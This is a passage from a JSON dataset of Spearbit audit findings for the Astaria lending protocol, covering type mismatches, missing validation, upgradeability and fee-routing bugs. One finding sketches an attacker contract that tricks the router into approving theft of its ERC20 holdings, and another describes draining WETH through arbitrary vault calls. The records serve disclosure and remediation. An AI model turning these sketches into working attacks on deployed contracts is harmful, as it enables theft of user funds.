      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7343",
      "title": "Wrong return parameter type is used for getOwed",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- LienToken.sol#L693\n- LienToken.sol#L701\n\n## Description\nBoth variations of `getOwed` use `_getOwed` and return `uint192`. But `_getOwed` returns a `uint88`.\n\n## Recommendation\nThe return types of both `getOwed` variations need to be changed to `uint88`. Also, note that most parameters that deal with lien amounts have the `uint88` type.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7342",
      "title": "ROUTER() can not be updated for private or public vaults",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n**AstariaVaultBase.sol#L14-L16**\n\n## Description\n`ROUTER()` is an immutable data for any `ClonesWithImmutableArgs.clone` that uses `AstariaVault`. That means for example if there is an issue with the current hardcoded `ROUTER()` or that it needs to be upgraded, the current public/private vaults would not be able to communicate with the new `ROUTER`.\n\n## Recommendation\nThis is something to keep in mind regarding the architecture of the protocol as the upgradability of the router can break the connection between it and the vaults.\n\n## Responses\n**Astaria:** Acknowledged, this is working as intended. We have a planned update that makes `LienToken` / `CollateralToken` / `AstariaRouter` all upgradeable proxies.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7341",
      "title": "OWNER() cannot be updated for private or public vaults",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\nAstariaVaultBase.sol#L22-L24\n\n## Description\n`owner()` is an immutable data for any `ClonesWithImmutableArgs.clone` that uses `AstariaVaultBase`. This means, for example, if there is an issue with the current hardcoded `owner()`, there is no way to update it, and liquidities/assets in the public/private vaults would also be at risk.\n\n## Recommendation\nIt might be best to allow change of ownership for vaults. The upgradeability for the owner might be more important than the router, as mentioned in PR 107.\n\n## Stakeholder Responses\n**Astaria:** Acknowledged. We don't want strategists to be able to assign someone else to their vaults; this is working as intended.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7340",
      "title": "PublicVault 'sredeem andredeemFutureEpoch always returns 0assets.",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- PublicVault.sol#L133\n- PublicVault.sol#L148\n- PublicVault.sol#L114\n\n## Description\nAssets returned by `redeem` and `redeemFutureEpoch` will always be 0, since it has not been set in `redeemFutureEpoch`. The `AlsoWithdraw` event emits an incorrect value for the asset because of this. The issue stems from trying to consolidate some of the logic for `redeem` and `withdraw` by using `redeemFutureEpoch` for both of them.\n\n## Recommendation\nMake sure the amount of assets is calculated for these endpoints and pay extra attention to the 2 different routing of `withdraw` and `redeem`.\n\n## Astaria\nFixed in PR 227.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7339",
      "title": "The modified implementation of redeem is omitting a check to make sure not to redeem 0assets.",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity: Low Risk\n\n### Context\n- **File:** PublicVault.sol\n  - Line 108\n  - Line 141\n\n### Description\nThe modified implementation of `redeem` is omitting the check:\n\n```solidity\n// Check for rounding error since we round down in previewRedeem.\nrequire((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n```\n\nYou can see a trail of it in `redeemFutureEpoch`.\n\n### Recommendation\nIt is recommended to reintroduce the check to ensure that 0 assets are not allowed to be redeemed, or document the decision as to why the check was omitted.\n\n### References\n- **Astaria:** Fixed in PR 227.\n- **Spearbit:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7338",
      "title": "getLiquidationWithdrawRatio() andgetYIntercept() have incorrect return types",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- PublicVault.sol#L170-L172\n- PublicVault.sol#L174-L176\n\n## Description\n`liquidationWithdrawRatio` and `yIntercept`, like other amount-related parameters, are of type `uint88` and they are the returned values of `getLiquidationWithdrawRatio()` and `getYIntercept()`, respectively. However, the return type of `getLiquidationWithdrawRatio()` and `getYIntercept()` are defined as `uint256`.\n\n## Recommendation\nChange the return types of `getLiquidationWithdrawRatio()` and `getYIntercept()` to `uint88`:\n\n```solidity\nfunction getLiquidationWithdrawRatio() public view returns (uint88) {\n    return _loadStorageSlot().liquidationWithdrawRatio;\n}\n\nfunction getYIntercept() public view returns (uint88) {\n    return _loadStorageSlot().yIntercept;\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7337",
      "title": "Router#file has update for nonexistent MinInterestRate variable",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nAstariaRouter.sol#L247-248\n\n## Description\nOne of the options in the `file()` function is to update `FileType.MinInterestRate`. There are two problems here:\n1. If someone chooses this `FileType`, the update actually happens to `s.maxInterestRate`.\n2. There is no `minInterestRate` storage variable, as `minInterestBPS` is handled on L235-236.\n\n## Recommendation\nRemove the `else if` block on L247-248.\n\n## Astaria\nFixed in PR 230.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7336",
      "title": "Inconsistency in byte size of maxInterestRate",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\n`AstariaRouter.sol#L246`\n\n## Description\nIn `RouterStorage`, `maxInterestRate` has a size of `uint88`. However, when being set from `file()`, it is capped at `uint48` by the `safeCastTo48()` function.\n\n## Recommendation\nMake sure these two values align.\n\n## Status\n- **Astaria**: Fixed in PR 246.\n- **Spearbit**: Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7335",
      "title": "Any ERC20 held in the Router can be stolen using ERC4626RouterBase functions",
      "impact": "LOW",
      "content": "## Security Analysis Report\n\n## Severity\n**Low Risk**\n\n## Context\n`ERC4626RouterBase.sol#L15-65`\n\n## Description\nAll four functions in `ERC4626RouterBase.sol` take in a vault address, a `to` address, a shares amount, and a `maxAmountIn` for validation. The first step is to read `vault.asset()` and then approve the vault to spend the ERC20 at whatever address is returned for the given amount.\n\n### Function: `mint`\n```solidity\nfunction mint(\n    IERC4626 vault,\n    address to,\n    uint256 shares,\n    uint256 maxAmountIn\n) public payable virtual override returns (uint256 amountIn) {\n    ERC20(vault.asset()).safeApprove(address(vault), shares);\n    if ((amountIn = vault.mint(shares, to)) > maxAmountIn) {\n        revert MaxAmountError();\n    }\n}\n```\n\nIn the event that the Router holds any ERC20, a malicious user can design a contract with the following functions:\n```solidity\nfunction asset() view pure returns (address) {\n    return [ERC20 the router holds];\n}\nfunction mint(uint shares, address to) view pure returns (uint) {\n    return 0;\n}\n```\nIf this contract is passed as the vault, the function will pass, and the router will approve this contract to control its holdings of the given ERC20.\n\n## Recommendation\nThese functions should validate that the vault being passed into the contract is a legitimate Astaria vault.\n\n## Additional Information\n**Astaria:** Accepted recommendations, fixed in PR 253.  \n**Spearbit:** Confirmed, the following commit fixes this issue by overriding the functions and adding a `validVault()` modifier to them, so only valid vaults can be used in the function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7334",
      "title": "Astaria's Seaport orders may not be listed on OpenSea",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\n`CollateralToken.sol#L524-L530`\n\n## Description\nTo list Seaport orders on OpenSea, the order should pass certain validations as described [here](OpenSea Order Validation). Currently, Astaria orders will fail this validation. For instance, `zone` and `zoneHash` values are not set as suggested.\n\n## Recommendation\nEither follow the guidelines completely to list the orders on OpenSea. If that's not the intention, `OS_FEE_PAYEE` can be removed from consideration items.\n\n## Responses\n**Astaria:** Acknowledged. We're going to change our approach and wait for Seaport 1.2.  \n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7333",
      "title": "External call to arbitrary address",
      "impact": "LOW",
      "content": "## Findings Report\n\n## Severity\n**Low Risk**\n\n## Context\n- AstariaRouter.commitToLiens\n- AstariaRouter._executeCommitment\n\n## Description\nThe Router has a convenience function to commit to multiple liens: `AstariaRouter.commitToLiens`. This function causes the router to receive WETH and allows the caller to supply an arbitrary vault address via `Request.strategy.vault`, which is called by the router. \n\nThis setup permits the potential for the caller to re-enter in the middle of the loop, and also allows them to drain any WETH that happens to be in the Router. During our review, no immediate reason for the Router to have WETH outside of `commitToLiens` calls was identified, and therefore the severity of this finding is low.\n\n## Recommendation\nTo protect against potential malicious calls, `isValidVault` should be checked against any calls to vaults.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7332",
      "title": "Factor out s.slope updates",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- PublicVault.sol#L422\n- PublicVault.sol#L491\n- PublicVault.sol#L528\n- PublicVault.sol#L579\n- PublicVault.sol#L615\n\n## Description:\nSlope updates occur in multiple locations but do not emit events.\n\n## Recommendation:\nEmit an event when updating slope. For ease of testing, consider moving slope updates to an internal function and emit an event when called.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7331",
      "title": "Ensure all ratios are less than 1",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nAstariaRouter.sol#L212-L227\n\n## Description\nAlthough numerators and denominators for different fees are set by admin, it's a good practice to add a check in the contract for absurd values. In this case, that would be when numerator is greater than denominator.\n\n## Recommendation\nAdd a require check for each numerator highlighted in Context:\n```solidity\nrequire(numerator < denominator, \"MAX_FEE_EXCEEDED\");\n```\nYou can also use custom errors instead.\n\n## Astaria\nFixed in commits b43317 and a883a3.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7330",
      "title": "buyoutLien ,canLiquidate and makePayment have different notion of expired liens when considering edge cases",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- VaultImplementation.sol#L305\n- LienToken.sol#L731\n- AstariaRouter.sol#L509\n\n## Description\nWhen swapping a lien that is just expired (lien's end time equals the current timestamp `tnow`), one can call `buyoutLien` to swap it out. But when `tnow > tend`, `buyoutLien` reverts due to the underflow in `_getRemainingInterest` when calculating the buyout amount. This is in contrast to `canLiquidate` which allows a lien with `tnow = tend` to liquidate as well. \n\n`makePayment` also only considers `tend < tnow` as expired liens. So the expired/non-functional liens time ranges for different endpoints are:\n\n| Endpoint     | Expired Range |\n|--------------|---------------|\n| buyoutLien   | (tend, 1)     |\n| canLiquidate | [tend, 1)     |\n| makePayment  | (tend, 1)     |\n\n## Recommendation\nMake sure the edge case of `tnow = tend` is treated consistently for expired liens across the 3 endpoints in this context.\n\n## Astaria\nAll the ranges have been unified to consider [tend, 1) as the expired range in commit 36ceb.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7329",
      "title": "Incorrect key parameter type is used for s.epochData",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n`PublicVault.sol#/*`\n\n## Description\nIn `PublicVault`, whenever the epoch key provided is to the mapping `s.epochData`, its type is `uint64`, but the type of `s.epochData` is `mapping(uint256 => EpochData)`.\n\n## Recommendation\nSince the epoch `s` have `uint64` type, it would be best to define `VaultData` as:\n\n```solidity\nstruct VaultData {\n    uint88 yIntercept;\n    uint48 slope;\n    uint40 last;\n    uint64 currentEpoch; // <-- pay attention to the type of epochs\n    uint88 withdrawReserve;\n    uint88 liquidationWithdrawRatio;\n    uint88 strategistUnclaimedShares;\n    mapping(uint64 => EpochData) epochData; // <-- changed line\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7328",
      "title": "BEACON_PROXY_IMPLEMENTATION andWETH cannot be updated for AstariaRouter",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- IAstariaRouter.sol#L67\n- IAstariaRouter.sol#L72\n\n## Description\nThere is no update mechanism for `BEACON_PROXY_IMPLEMENTATION` and `WETH` in `AstariaRouter`. It would make sense that one would want to keep `WETH` as not upgradable (unless we provide the wrong address to the constructor). However, for `BEACON_PROXY_IMPLEMENTATION`, there could be possibilities of potentially upgrading it.\n\n## Recommendation\nIf there is no plan to add an upgrading mechanism to these storage parameters, they can be defined as immutables. If there is a plan to use a diamond/facet pattern for the `AstariaRouter` and related contracts, it might be best to document it to clarify the reasoning for the current storage structures. Additionally, since other implementation parameters have been made upgradable, it would make sense for `BEACON_PROXY_IMPLEMENTATION` to also be upgradable or document why it is not currently.\n\n## Additional Notes\nAstaria: `wETH` being a storage variable is removed in an open PR, so we acknowledge the lack of a setter; it came from a previously immutable design. The beacon proxy is not designed to be updated either in its current form, as any changes to the underlying or new features would leave older proxies in the dust.\n\nSpearbit: Acknowledged by Astaria.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7327",
      "title": "ERC20-Cloned allows certain actions for address(0)",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context:\n- ERC20-Cloned.sol#L39\n- ERC20-Cloned.sol#L99\n- ERC20-Cloned.sol#L76\n- ERC20-Cloned.sol#L167\n- ERC20-Cloned.sol#L180\n- ERC20-Cloned.sol#L46\n\n## Description:\nIn `ERC20-Cloned`, `address(0)` can be used as the:\n- spender (`spender`)\n- to parameter of `transferFrom`\n- to parameter of `transfer`\n- to parameter of `_mint`\n- from parameter of `_burn`\n\nAs an example, one can transfer or `transferFrom` to `address(0)`, which would turn the amount of tokens unusable, but those do not update the total supply, in contrast to if `_burn` was called.\n\n## Recommendation:\nThe decision to not check these addresses to make sure they cannot be assigned to `address(0)` is against the OpenZeppelin implementation of ERC20. It is recommended to have these checks to avoid introducing quirks regarding `address(0)`.\n\n## Astaria:\nAcknowledged.\n\n## Spearbit:\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7326",
      "title": "buyoutLien is prone to race conditions",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity: Low Risk\n\n### Context\n- LienToken.sol#L102\n- VaultImplementation.sol#L305\n\n### Description\n`LienToken.buyoutLien` and `VaultImplementation.buyoutLien` are both prone to race conditions where multiple vaults can try to front-run each other's `buyoutLien` call to end up registering their own lien. Also note, due to the storage values `s.minInterestBPS` and `s.minDurationIncrease` being used in the `isValidRefinance`, the winning `buyoutLien` call does not necessarily have to have the best rate or duration among the other candidates in the race.\n\n### Recommendation\nMake sure to document this. The current race between the vaults is not in an ideal condition for vaults and only sometimes favors picking the best liens for the borrower. A better mechanism to avoid the race condition would be to introduce an auctioning process to buy out a lien and ensure the auction's picking strategy is sound.\n\n### Acknowledgements\n- **Astaria**: Acknowledged.\n- **Spearbit**: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7325",
      "title": "Update solc version and use unchecked in Uniswap related libraries",
      "impact": "MEDIUM",
      "content": "## Security Assessment Report\n\n## Severity: Medium Risk\n\n### Context\n- **Files Involved**: FullMathUniswap.sol, LiquidityAmounts.sol, TickMath.sol\n\n### Description\nThe highlighted libraries above are referenced from the Uniswap codebase, which is intended to work with the Solidity compiler <0.8. These older versions have unchecked arithmetic by default, and the code takes this into account.\n\nAstaria code is intended to work with the Solidity compiler >=0.8, which doesn't have unchecked arithmetic by default. Hence, to port the code, it has to be turned on via the `unchecked` keyword.\n\nFor example, `FullMathUniswap.mulDiv(type(uint).max, type(uint).max, type(uint).max)` reverts for v0.8 and returns `type(uint).max` for older versions.\n\n### Recommendation\n- Update the pragma of all three files to:\n  ```solidity\n  pragma solidity ^0.8.4;\n  ```\n- Wrap all the function bodies in `unchecked`.\n\n### Status\n- **Astaria**: Fixed in PR 9.\n- **Spearbit**: Verified.",
      "summary": "\nThis bug report relates to the Solidity compiler used in the Uniswap codebase. The codebase is intended to work with a Solidity compiler version <0.8, which has unchecked arithmetic by default. However, Astaria code is intended to work with Solidity compiler version >=0.8 which does not have unchecked arithmetic by default. Therefore, to port the code, the unchecked keyword has to be used. For example, FullMathUniswap.mulDiv(type(uint).max, type(uint).max, type(uint).max) reverts for v0.8, and returns type(uint).max for older version.\n\nThe recommendation to fix this issue is to update the pragma of all the three files to: pragma solidity ^0.8.4; and wrap all the function bodies in unchecked. Astaria has fixed the issue in PR 9, and Spearbit has verified it.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "SOLC Version"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7324",
      "title": "Previous withdraw proxy's withdrawReserveReceived is not updated when assets are drained from the current withdraw proxy to the previous",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PublicVault.sol#L378-L381`\n\n## Description\nWhen `drain` is called, we don't update the `s.epochData[s.currentEpoch - 1].withdrawReserveReceived`. This is in contrast to when withdraw reserves are transferred from the public vault to the withdraw proxy. This would unlink the previous withdraw proxy's `withdrawReserveReceived` storage parameter from the total amount of assets it has received from either the public vault or the current withdraw proxy.\n\nAn actor can manipulate `Bn-1` (the previous withdraw proxy's asset balance) and `Wn-1` (the previous withdraw proxy's `withdrawReserveReceived`) by sending assets to the public vault and the current withdraw proxy before calling `transferWithdrawReserve`. Here, `n` is the public vault's epoch. `Bn-1` and `Wn-1` should really represent the sum of all near-boundary auction payments the previous withdraw proxy receives plus any assets that are transferred to it by an external actor.\n\n**Related Issue:** #46\n\n## Recommendation\nThe current behavior of draining assets from the current withdraw proxy to the previous one is inconsistent compared to when assets are transferred from the public vault to the previous withdraw proxy, which:\n\n- Updates the public vault's `s.withdrawReserve`.\n- Transfers the assets.\n- Updates the previous withdraw proxy's `withdrawReserveReceived`.\n\nIn the case of the `drain`, the first two points are performed, but the last one is missing. Based on the behavior and other calculations, it seems that `withdrawReserveReceived` would also need to be updated.",
      "summary": "\nThis bug report is about the inconsistency in the behavior of draining assets from the current withdraw proxy to the previous. When assets are transferred from the public vault to the previous withdraw proxy, the public vault's s.withdrawReserve and the previous withdraw proxy's withdrawReserveReceived are both updated. However, when draining assets from the current withdraw proxy to the previous, the withdrawReserveReceived is not updated. This can lead to an actor manipulating the value of Bn-1-Wn-1 (previous withdraw proxy's asset balance minus previous withdraw proxy's withdrawReserveReceived) by sending assets to the public vault and the current withdraw proxy before calling transferWithdrawReserve. \n\nThe recommendation is to update the withdrawReserveReceived when draining assets from the current withdraw proxy to the previous, to match the behavior when transferring assets from the public vault to the previous withdraw proxy. This would ensure that Bn-1-Wn-1 accurately represents the sum of all near-boundary auction payment's the previous withdraw proxy receives plus any assets that are transferred to it by an external actor.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7323",
      "title": "potentialDebt is not compared against a new lien's maxPotentialDebt in_appendStack",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`LienToken.sol#L435-L439`\n\n## Description\nIn `_appendStack`, we have the following block:\n\n```solidity\nnewStack = new Stack[](stack.length + 1);\nnewStack[stack.length] = newSlot;\nuint256 potentialDebt = _getOwed(newSlot, newSlot.point.end);\n...\nif (\n    stack.length > 0 && potentialDebt > newSlot.lien.details.maxPotentialDebt\n) {\n    revert InvalidState(InvalidStates.DEBT_LIMIT);\n}\n```\n\nNote, we are only performing a comparison between `newSlot.lien.details.maxPotentialDebt` and `potentialDebt` when `stack.length > 0`. If `_createLien` is called with `params.stack.length == 0`, we would not perform this check and thus the input params are not fully checked for misconfiguration.\n\n## Recommendation\nMake sure to perform this check in either `_createLien` or here in `_appendStack` by removing the `stack.length > 0` condition:\n\n```solidity\n// `potentialDebt` needs to be calculated in `_createLien`\nif (potentialDebt > params.lien.details.maxPotentialDebt) {\n    revert InvalidState(InvalidStates.DEBT_LIMIT);\n}\n```\n\n## Acknowledgments\n- **Astaria:** Acknowledged.\n- **Spearbit:** Acknowledged.",
      "summary": "\nThis bug report discusses an issue in the LienToken.sol code. Specifically, the code is not performing a comparison between newSlot.lien.details.maxPotentialDebt and potentialDebt when stack.length is 0. This means that the input params is not being fully checked for misconfiguration.\n\nThe recommendation is to make sure to perform the check in either _createLien or _appendStack by removing the stack.length > 0 condition. This would ensure that the comparison between newSlot.lien.details.maxPotentialDebt and potentialDebt is always performed, regardless of the stack.length value. Astaria and Spearbit have acknowledged the recommendation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7322",
      "title": "When the collateral is listed on SeaPort by the borrower using listForSaleOnSeaport , when settled the liquidation fee will be sent to address(0)",
      "impact": "MEDIUM",
      "content": "## Security Assessment Report\n\n## Severity\n**Medium Risk**\n\n## Context\nLienToken.sol#L472-L477\n\n## Description\nWhen the collateral is listed on SeaPort by the borrower using `listForSaleOnSeaport`, `s.auctionData[collateralId].liquidator` (and `s.auctionData` in general) will not be set and will default to `address(0)`. Consequently, the `liquidatorPayment` will be sent to `address(0)`.\n\n## Recommendation\nBefore calculating and transferring the liquidation fee, make sure that the liquidator is not `address(0)`.\n\n## Astaria\nFixed in PR 206.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about the LienToken.sol#L472-L477 code, which is of medium risk. When the collateral is listed on SeaPort by the borrower, the liquidator (s.auctionData in general) will not be set and thus the liquidatorPayment will be sent to address(0). This could cause an issue as the liquidation fee will be sent to address(0). To fix this, it is recommended that before calculating and transferring the liquidation fee, the liquidator should be checked to make sure it is not address(0). This issue was fixed in PR 206 and verified by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Zach Obront",
        "Sawmon and Natalie",
        "Blockdev",
        "Noah Marconi"
      ]
    },
    {
      "id": "7321",
      "title": "First vault deposit can cause excessive rounding",
      "impact": "MEDIUM",
